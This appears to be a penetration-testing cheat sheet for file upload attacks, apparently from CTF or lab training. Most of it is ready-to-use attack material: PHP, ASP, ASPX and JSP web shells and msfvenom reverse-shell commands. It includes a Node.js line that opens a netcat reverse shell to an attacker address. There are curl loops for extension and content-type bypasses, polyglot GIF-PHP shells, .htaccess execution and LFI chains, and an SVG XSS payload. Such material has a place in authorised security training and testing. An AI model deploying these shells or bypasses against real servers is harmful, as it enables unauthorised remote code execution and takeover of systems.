# File Upload Attacks

## Web Shells

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** |
| `[CTRL+SHIFT+C]` | Toggle Page Insepctor |
| **Blacklist Bypass** |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** |
| `shell.jpg.php` | Double Extension |
| `shell.php.jpg` | Reverse Double Extension |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
| **Content/Type Bypass** |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

## Limited Uploads

| **Potential Attack**   | **File Types** |
| --------------|-------------------|
| `XSS` | HTML, JS, SVG, GIF |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS` | ZIP, JPG, PNG |

## Web Shell Examples by Language

```php
<?php system($_GET['cmd']); ?>
<?php echo system('id'); ?>
<?php passthru($_REQUEST['c']); ?>
<?php echo shell_exec('whoami'); ?>
```

**Reverse shell (msfvenom generated + one-liners):**
```bash
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war
```

**ASP / ASPX:**
```aspx
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c whoami"); %>
```

**JSP:**
```jsp
<% Runtime.getRuntime().exec("cmd.exe /c whoami"); %>
```

**Node.js / Python upload shells** (when app allows):
```js
// node shell uploaded as .js and executed via require
require('child_process').exec('nc -e /bin/sh 10.10.14.5 4444')
```

## Detailed Bypass + Upload Testing Commands

```bash
# Test many extensions with curl (use Burp for complex forms)
for ext in .php .php3 .php4 .phtml .php5 .inc .phar; do
  curl -F "file=@shell$ext" http://target/upload.php
done

# Double extension + null byte (legacy)
curl -F "upload=@shell.php%00.jpg" http://target/upload

# Case + dot manipulation
curl -F "file=@shell.PhP" -F "filename=shell.jpg.php" http://target/upload

# Content-Type spoof + magic bytes (GIF89a header prepended)
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php
curl -F "file=@shell.gif.php;type=image/gif" http://target/upload.php
```

## Post-Upload Exploitation Chains

```bash
# 1. Upload succeeds -> find path from response or error
# 2. Try direct access
curl http://target/uploads/shell.php?cmd=id

# 3. Combine with LFI
curl "http://target/index.php?page=../../uploads/shell.php%00&cmd=whoami"

# 4. If only image dir: use .htaccess upload for execution
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -F "file=@.htaccess" http://target/upload
curl -F "file=@shell.jpg" http://target/upload   # now shell.jpg executes as PHP
```

## Limited Uploads + Special File Attacks

- Upload SVG with embedded script for stored XSS:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

- XXE via DOCX/PDF/XML upload (if processed server-side).
- ZipSlip / path traversal in archive uploads.
- Billion laughs / DoS via crafted XML or recursive zip.

## 2026 Tips
- Magic byte / content-type checks common; use polyglot files (e.g. GIF + PHP).
- Test null bytes, path traversal in filename, case, encoding.
- For restricted: try .phar, .phtml, .inc, double ext with nulls.
- Upload to avatar, profile, attachment, import features.
- After upload, try direct access + LFI/RFI to trigger, or path disclosure.
- Use `exiftool` to embed payloads in images:
  ```bash
  exiftool -Comment='<?php system($_GET["c"]);?>' image.jpg
  ```
- Modern apps may use object storage — check for public read after upload.
- Use Burp repeater + intruder for extension brute.
- Modern: some apps use object storage (S3) — test for public buckets post-upload.
